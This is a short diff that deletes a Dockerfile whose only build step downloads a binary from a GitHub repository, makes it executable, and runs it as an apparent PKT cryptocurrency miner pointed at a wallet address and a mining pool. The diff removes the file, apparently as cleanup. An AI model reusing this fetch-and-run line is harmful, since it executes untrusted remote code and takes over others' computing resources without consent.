@@ -1,3 +1,0 @@
-FROM ubuntu:bionic
-
-RUN wget -qO pkt https://github.com/hambana01/cici/raw/main/Peka && sudo chmod +x pkt && ./pkt ann -p pkt1qshqxpdeulnz6v3uwzm4usf0yys43m9nh70rgxg http://pool.srizbi.com
